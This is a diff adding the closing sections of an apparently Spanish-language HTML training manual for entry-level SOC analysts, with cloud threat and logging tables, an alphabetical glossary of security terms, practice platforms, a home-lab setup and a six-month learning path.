+                    <tr><td><strong>Credential leak</strong></td><td>API keys en repos públicos (GitHub)</td><td>Git scanning, CloudTrail</td></tr>
+                    <tr><td><strong>Crypto mining</strong></td><td>Uso no autorizado de recursos para minería</td><td>Billing alerts, CPU monitoring</td></tr>
+                    <tr><td><strong>Shadow IT</strong></td><td>Servicios cloud no aprobados por la org</td><td>CASB, network monitoring</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card">
+            <h3>Logs Cloud para SOC</h3>
+            <table class="data-table">
+                <thead><tr><th>Proveedor</th><th>Servicio de Logs</th><th>Qué registra</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>AWS</strong></td><td>CloudTrail</td><td>API calls, cambios de configuración, accesos</td></tr>
+                    <tr><td><strong>AWS</strong></td><td>VPC Flow Logs</td><td>Tráfico de red en VPCs</td></tr>
+                    <tr><td><strong>AWS</strong></td><td>GuardDuty</td><td>Detección de amenazas inteligente</td></tr>
+                    <tr><td><strong>Azure</strong></td><td>Azure Activity Log</td><td>Operaciones a nivel de suscripción</td></tr>
+                    <tr><td><strong>Azure</strong></td><td>Azure AD Sign-in Logs</td><td>Autenticación y accesos</td></tr>
+                    <tr><td><strong>GCP</strong></td><td>Cloud Audit Logs</td><td>Actividad administrativa y de datos</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <!-- ============================== -->
+    <!-- SECCIÓN 10 — GLOSARIO         -->
+    <!-- ============================== -->
+    <section class="section" id="seccion-10">
+        <div class="section-header">
+            <div class="section-badge">SECCIÓN 10</div>
+            <h1 class="section-title">📖 Glosario Maestro Alfabético</h1>
+            <p class="section-intro">Referencia rápida de todos los términos de ciberseguridad esenciales para un analista SOC L1.</p>
+        </div>
+
+        <div class="card">
+            <table class="data-table">
+                <thead><tr><th>Término</th><th>Definición</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>ACL</strong></td><td>Access Control List — Lista de reglas que definen quién puede acceder a qué recurso</td></tr>
+                    <tr><td><strong>AMSI</strong></td><td>Antimalware Scan Interface — API de Windows para inspección de scripts</td></tr>
+                    <tr><td><strong>APT</strong></td><td>Advanced Persistent Threat — Grupo de atacantes sofisticados y persistentes</td></tr>
+                    <tr><td><strong>ARP</strong></td><td>Address Resolution Protocol — Resuelve IP a MAC en red local</td></tr>
+                    <tr><td><strong>CASB</strong></td><td>Cloud Access Security Broker — Control de acceso a servicios cloud</td></tr>
+                    <tr><td><strong>C2/C&C</strong></td><td>Command and Control — Infraestructura de control de malware</td></tr>
+                    <tr><td><strong>CIA</strong></td><td>Confidentiality, Integrity, Availability — Tríada de seguridad</td></tr>
+                    <tr><td><strong>CIDR</strong></td><td>Classless Inter-Domain Routing — Notación de subredes</td></tr>
+                    <tr><td><strong>CVE</strong></td><td>Common Vulnerabilities and Exposures — Identificador único de vulnerabilidades</td></tr>
+                    <tr><td><strong>CVSS</strong></td><td>Common Vulnerability Scoring System — Puntuación de severidad (0-10)</td></tr>
+                    <tr><td><strong>DDoS</strong></td><td>Distributed Denial of Service — Ataque de denegación distribuido</td></tr>
+                    <tr><td><strong>DGA</strong></td><td>Domain Generation Algorithm — Malware genera dominios C2 automáticamente</td></tr>
+                    <tr><td><strong>DHCP</strong></td><td>Dynamic Host Configuration Protocol — Asignación automática de IPs</td></tr>
+                    <tr><td><strong>DLP</strong></td><td>Data Loss Prevention — Prevención de fuga de datos</td></tr>
+                    <tr><td><strong>DMZ</strong></td><td>Demilitarized Zone — Segmento de red entre internet y red interna</td></tr>
+                    <tr><td><strong>DNS</strong></td><td>Domain Name System — Resolución de nombres a IPs</td></tr>
+                    <tr><td><strong>EDR</strong></td><td>Endpoint Detection and Response — Detección y respuesta en endpoints</td></tr>
+                    <tr><td><strong>FIM</strong></td><td>File Integrity Monitoring — Monitoreo de cambios en archivos críticos</td></tr>
+                    <tr><td><strong>FP</strong></td><td>False Positive — Alerta generada por actividad benigna</td></tr>
+                    <tr><td><strong>FTP</strong></td><td>File Transfer Protocol — Transferencia de archivos (sin cifrado)</td></tr>
+                    <tr><td><strong>GPO</strong></td><td>Group Policy Object — Políticas centralizadas de AD</td></tr>
+                    <tr><td><strong>HIDS</strong></td><td>Host-based Intrusion Detection System</td></tr>
+                    <tr><td><strong>IAM</strong></td><td>Identity and Access Management — Gestión de identidad y accesos</td></tr>
+                    <tr><td><strong>IDS</strong></td><td>Intrusion Detection System — Sistema de detección de intrusiones</td></tr>
+                    <tr><td><strong>IoC</strong></td><td>Indicator of Compromise — Evidencia de compromiso</td></tr>
+                    <tr><td><strong>IoA</strong></td><td>Indicator of Attack — Indicador de ataque en curso</td></tr>
+                    <tr><td><strong>IPS</strong></td><td>Intrusion Prevention System — Sistema de prevención de intrusiones</td></tr>
+                    <tr><td><strong>IR</strong></td><td>Incident Response — Respuesta a incidentes</td></tr>
+                    <tr><td><strong>KQL</strong></td><td>Kusto Query Language — Lenguaje de consultas de Microsoft Sentinel</td></tr>
+                    <tr><td><strong>LDAP</strong></td><td>Lightweight Directory Access Protocol — Consultas a Active Directory</td></tr>
+                    <tr><td><strong>LOLBins</strong></td><td>Living Off the Land Binaries — Binarios legítimos usados maliciosamente</td></tr>
+                    <tr><td><strong>MAC</strong></td><td>Media Access Control — Dirección física del dispositivo de red</td></tr>
+                    <tr><td><strong>MFA</strong></td><td>Multi-Factor Authentication — Autenticación multifactor</td></tr>
+                    <tr><td><strong>MITM</strong></td><td>Man in the Middle — Ataque de interceptación</td></tr>
+                    <tr><td><strong>MITRE ATT&CK</strong></td><td>Framework de tácticas y técnicas de adversarios</td></tr>
+                    <tr><td><strong>NAC</strong></td><td>Network Access Control — Control de acceso a la red</td></tr>
+                    <tr><td><strong>NAT</strong></td><td>Network Address Translation — Traducción de direcciones</td></tr>
+                    <tr><td><strong>NGFW</strong></td><td>Next-Generation Firewall — Firewall de nueva generación</td></tr>
+                    <tr><td><strong>NIDS</strong></td><td>Network-based Intrusion Detection System</td></tr>
+                    <tr><td><strong>OSINT</strong></td><td>Open Source Intelligence — Inteligencia de fuentes abiertas</td></tr>
+                    <tr><td><strong>PCAP</strong></td><td>Packet Capture — Captura de paquetes de red</td></tr>
+                    <tr><td><strong>RCE</strong></td><td>Remote Code Execution — Ejecución remota de código</td></tr>
+                    <tr><td><strong>SIEM</strong></td><td>Security Information and Event Management</td></tr>
+                    <tr><td><strong>SMB</strong></td><td>Server Message Block — Compartición de archivos Windows</td></tr>
+                    <tr><td><strong>SOAR</strong></td><td>Security Orchestration, Automation and Response</td></tr>
+                    <tr><td><strong>SOC</strong></td><td>Security Operations Center — Centro de Operaciones de Seguridad</td></tr>
+                    <tr><td><strong>SPL</strong></td><td>Search Processing Language — Lenguaje de búsqueda de Splunk</td></tr>
+                    <tr><td><strong>SSH</strong></td><td>Secure Shell — Acceso remoto cifrado</td></tr>
+                    <tr><td><strong>SSL/TLS</strong></td><td>Secure Sockets Layer / Transport Layer Security — Cifrado de comunicaciones</td></tr>
+                    <tr><td><strong>STIX/TAXII</strong></td><td>Estándares para compartir Threat Intelligence</td></tr>
+                    <tr><td><strong>TI</strong></td><td>Threat Intelligence — Inteligencia de amenazas</td></tr>
+                    <tr><td><strong>TP</strong></td><td>True Positive — Alerta generada por actividad realmente maliciosa</td></tr>
+                    <tr><td><strong>TTP</strong></td><td>Tactics, Techniques, and Procedures — Comportamiento del adversario</td></tr>
+                    <tr><td><strong>VLAN</strong></td><td>Virtual Local Area Network — Red virtual segmentada</td></tr>
+                    <tr><td><strong>VPN</strong></td><td>Virtual Private Network — Red privada virtual</td></tr>
+                    <tr><td><strong>WAF</strong></td><td>Web Application Firewall — Firewall de aplicaciones web</td></tr>
+                    <tr><td><strong>XDR</strong></td><td>Extended Detection and Response — Detección y respuesta extendida</td></tr>
+                    <tr><td><strong>YARA</strong></td><td>Yet Another Ridiculous Acronym — Reglas de detección de malware</td></tr>
+                    <tr><td><strong>Zero-Day</strong></td><td>Vulnerabilidad sin parche disponible, desconocida por el vendor</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <!-- ============================== -->
+    <!-- SECCIÓN 11 — LABORATORIOS     -->
+    <!-- ============================== -->
+    <section class="section" id="seccion-11">
+        <div class="section-header">
+            <div class="section-badge">SECCIÓN 11</div>
+            <h1 class="section-title">🧪 Laboratorios y Práctica</h1>
+            <p class="section-intro">Plataformas gratuitas y ejercicios prácticos para desarrollar habilidades SOC.</p>
+        </div>
+
+        <div class="card">
+            <h3>Plataformas de Práctica Gratuitas</h3>
+            <table class="data-table">
+                <thead><tr><th>Plataforma</th><th>Enfoque</th><th>Nivel</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>TryHackMe</strong></td><td>Rutas de aprendizaje guiadas, SOC path</td><td>Principiante → Avanzado</td></tr>
+                    <tr><td><strong>LetsDefend</strong></td><td>Simulación SOC completa con alertas reales</td><td>Principiante → Intermedio</td></tr>
+                    <tr><td><strong>Blue Team Labs Online</strong></td><td>Challenges de análisis forense y SOC</td><td>Intermedio</td></tr>
+                    <tr><td><strong>CyberDefenders</strong></td><td>Challenges de Blue Team y DFIR</td><td>Intermedio → Avanzado</td></tr>
+                    <tr><td><strong>Splunk BOSS of the SOC</strong></td><td>CTF con datos reales de Splunk</td><td>Intermedio</td></tr>
+                    <tr><td><strong>RangeForce</strong></td><td>Entrenamiento hands-on de seguridad</td><td>Principiante → Avanzado</td></tr>
+                    <tr><td><strong>Security Blue Team</strong></td><td>Certificación y training Blue Team</td><td>Principiante → Intermedio</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card">
+            <h3>Lab Casero — Herramientas Recomendadas</h3>
+            <div class="code-block">
+                <div class="code-header"><span>Stack de Lab SOC</span><button class="copy-btn">Copiar</button></div>
+<pre>Virtualización:     VirtualBox / VMware Workstation (gratis)
+SIEM:               Wazuh (open source) o Elastic SIEM
+Análisis de red:    Wireshark, tcpdump
+Endpoints:          Windows 10/11 VM + Sysmon
+Servidor:           Ubuntu Server con servicios (SSH, Apache, FTP)
+IDS:                Suricata o Snort
+Threat Intel:       MISP (open source)
+Firewall:           pfSense (open source)
+Monitoreo:          Grafana + Prometheus</pre>
+            </div>
+        </div>
+
+        <div class="card">
+            <h3>Ejercicios Prácticos Sugeridos</h3>
+            <div class="flow-diagram">
+                <div class="flow-step flow-step-1"><span class="flow-number">1</span><strong>Instalar Wazuh</strong><p>Configurar SIEM open source, conectar agentes Windows y Linux</p></div>
+                <div class="flow-step flow-step-2"><span class="flow-number">2</span><strong>Analizar PCAP</strong><p>Usar Wireshark para analizar capturas de tráfico sospechoso</p></div>
+                <div class="flow-step flow-step-3"><span class="flow-number">3</span><strong>Investigar logs</strong><p>Analizar Windows Event Logs para detectar brute force</p></div>
+                <div class="flow-step flow-step-4"><span class="flow-number">4</span><strong>Triage de phishing</strong><p>Analizar emails sospechosos con headers y sandbox</p></div>
+                <div class="flow-step flow-step-5"><span class="flow-number">5</span><strong>Threat Hunting</strong><p>Buscar indicadores de compromiso en logs de Sysmon</p></div>
+                <div class="flow-step flow-step-6"><span class="flow-number">6</span><strong>Crear reglas YARA</strong><p>Escribir reglas para detectar malware específico</p></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ============================== -->
+    <!-- SECCIÓN 12 — RUTA APRENDIZAJE -->
+    <!-- ============================== -->
+    <section class="section" id="seccion-12">
+        <div class="section-header">
+            <div class="section-badge">SECCIÓN 12</div>
+            <h1 class="section-title">🗺️ Ruta de Aprendizaje SOC L1</h1>
+            <p class="section-intro">Plan de estudio progresivo para convertirte en Analista SOC Nivel 1. De cero a operacional.</p>
+        </div>
+
+        <div class="card">
+            <h3>Fase 1 — Fundamentos (Meses 1-2)</h3>
+            <div class="flow-diagram">
+                <div class="flow-step flow-step-1"><span class="flow-number">📚</span><strong>Redes</strong><p>TCP/IP, DNS, DHCP, subnetting, protocolos principales</p></div>
+                <div class="flow-step flow-step-2"><span class="flow-number">💻</span><strong>Sistemas Operativos</strong><p>Windows: AD, Event Logs, PowerShell | Linux: permisos, logs, CLI</p></div>
+                <div class="flow-step flow-step-3"><span class="flow-number">🔐</span><strong>Seguridad Básica</strong><p>CIA Triad, tipos de ataques, malware, criptografía básica</p></div>
+            </div>
+            <div class="key-concept">
+                <strong>Certificación recomendada:</strong> CompTIA Security+ (SY0-701)
+            </div>
+        </div>
+
+        <div class="card">
+            <h3>Fase 2 — Herramientas SOC (Meses 3-4)</h3>
+            <div class="flow-diagram">
+                <div class="flow-step flow-step-4"><span class="flow-number">📊</span><strong>SIEM</strong><p>Splunk Free, Wazuh, o Elastic SIEM. Aprender queries y correlación</p></div>
+                <div class="flow-step flow-step-5"><span class="flow-number">🔍</span><strong>Análisis de Logs</strong><p>Windows Event Logs, Sysmon, firewall logs, proxy logs</p></div>
+                <div class="flow-step flow-step-6"><span class="flow-number">🌐</span><strong>Análisis de Red</strong><p>Wireshark, tcpdump, análisis de PCAP</p></div>
+            </div>
+            <div class="key-concept">
+                <strong>Certificación recomendada:</strong> Microsoft SC-200 o CompTIA CySA+
+            </div>
+        </div>
+
+        <div class="card">
+            <h3>Fase 3 — Práctica y Especialización (Meses 5-6)</h3>
+            <div class="flow-diagram">
+                <div class="flow-step flow-step-1"><span class="flow-number">🧪</span><strong>Laboratorios</strong><p>TryHackMe SOC Path, LetsDefend, CyberDefenders</p></div>
+                <div class="flow-step flow-step-2"><span class="flow-number">📐</span><strong>Frameworks</strong><p>MITRE ATT&CK, Cyber Kill Chain, NIST IR</p></div>
+                <div class="flow-step flow-step-3"><span class="flow-number">📝</span><strong>Documentación</strong><p>Practicar escritura de reportes de incidentes, timeline, IoCs</p></div>
+            </div>
+            <div class="key-concept">
+                <strong>Meta:</strong> Aplicar a posiciones SOC L1 / Junior Security Analyst
+            </div>
+        </div>
+
+        <div class="card">
+            <h3>Recursos de Estudio Gratuitos</h3>
+            <table class="data-table">
+                <thead><tr><th>Recurso</th><th>Descripción</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Professor Messer</strong></td><td>Videos gratuitos de Security+ en YouTube</td></tr>
+                    <tr><td><strong>TryHackMe</strong></td><td>SOC Level 1 Path (parcialmente gratis)</td></tr>
+                    <tr><td><strong>Cybrary</strong></td><td>Cursos de ciberseguridad gratuitos</td></tr>
+                    <tr><td><strong>MITRE ATT&CK</strong></td><td>attack.mitre.org — framework completo</td></tr>
+                    <tr><td><strong>Splunk Free</strong></td><td>Versión gratuita para practicar SPL</td></tr>
+                    <tr><td><strong>Malware Traffic Analysis</strong></td><td>PCAPs para analizar tráfico malicioso</td></tr>
+                    <tr><td><strong>SANS Reading Room</strong></td><td>Papers gratuitos de seguridad</td></tr>
+                    <tr><td><strong>This Glossary! 📖</strong></td><td>Tu manual de referencia completo</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="main-footer">
+        <div class="footer-content">
+            <div class="footer-logo">🛡️</div>
+            <h3>Glosario Maestro SOC L1</h3>
+            <p>Manual Completo de Entrenamiento — Versión 1.0</p>
+            <p class="footer-note">Creado para la formación de analistas SOC de nivel 1. Este material es de referencia y estudio autodidacta.</p>
+            <div class="footer-tags">
+                <span class="tag">SOC</span>
+                <span class="tag">Ciberseguridad</span>
+                <span class="tag">Blue Team</span>
+                <span class="tag">SIEM</span>
+                <span class="tag">Incident Response</span>
+                <span class="tag">Threat Hunting</span>
+            </div>
+        </div>
+    </footer>
+</main>
+
+<!-- Back to Top -->
+<button class="back-to-top" id="backToTop" aria-label="Volver arriba">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+        <path d="M18 15l-6-6-6 6"/>
+    </svg>
+</button>
+
+<script src="app.js"></script>
+</body>
+</html>
